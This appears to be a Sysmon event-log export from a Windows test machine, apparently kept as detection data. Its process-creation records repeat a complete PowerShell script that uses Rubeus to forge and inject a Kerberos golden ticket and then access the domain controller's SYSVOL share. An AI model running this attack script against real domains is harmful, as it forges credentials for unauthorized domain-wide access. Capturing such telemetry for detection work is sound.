cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:45:13.187,,,,,,,,,11,9477,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:45:17.735

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\golden.bat

CreationUtcTime: 2023-12-28 09:45:13.187

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43ac-658d-7702-000000000b00},7044,3524,,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.7506865Z,C:\Users\User\AppData\Local\Temp\golden.bat,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.735,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.7506865Z""/>
      <EventRecordID>9477</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.735</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ac-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">3524</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:45:13.187</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:45:17.735

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\golden.bat

CreationUtcTime: 2023-12-28 09:45:13.187

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c C:\Users\User\AppData\Local\Temp\rubeus.exe golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:User /dc:WINDEV2309EVAL. /printcmd /outfile:golden",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9476,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.564

ProcessGuid: {fda94052-43ad-658d-7902-000000000b00}

ProcessId: 10864

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:\Users\User\AppData\Local\Temp\rubeus.exe golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:User /dc:WINDEV2309EVAL. /printcmd /outfile:golden

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ParentProcessId: 3524

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-43ac-658d-7702-000000000b00},3524,WINDEV2309EVAL\User,{fda94052-43ad-658d-7902-000000000b00},7044,10864,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.5660204Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.564,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.5660204Z""/>
      <EventRecordID>9476</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.564</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ad-658d-7902-000000000b00}</Data>
      <Data Name=""ProcessId"">10864</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c C:\Users\User\AppData\Local\Temp\rubeus.exe golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:User /dc:WINDEV2309EVAL. /printcmd /outfile:golden</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43ac-658d-7702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3524</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.564

ProcessGuid: {fda94052-43ad-658d-7902-000000000b00}

ProcessId: 10864

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:\Users\User\AppData\Local\Temp\rubeus.exe golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:User /dc:WINDEV2309EVAL. /printcmd /outfile:golden

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ParentProcessId: 3524

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:45:16.159,,,,,,,,,11,9475,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:45:16.159

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bmne1odm.r0r.ps1

CreationUtcTime: 2023-12-28 09:45:16.159

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43ac-658d-7702-000000000b00},7044,3524,,,,,,"
      ",-,,,,,,2023-12-28T09:45:16.1728674Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bmne1odm.r0r.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:16.159,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:16.1728674Z""/>
      <EventRecordID>9475</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:16.159</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ac-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">3524</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bmne1odm.r0r.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:45:16.159</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:45:16.159

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bmne1odm.r0r.ps1

CreationUtcTime: 2023-12-28 09:45:16.159

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
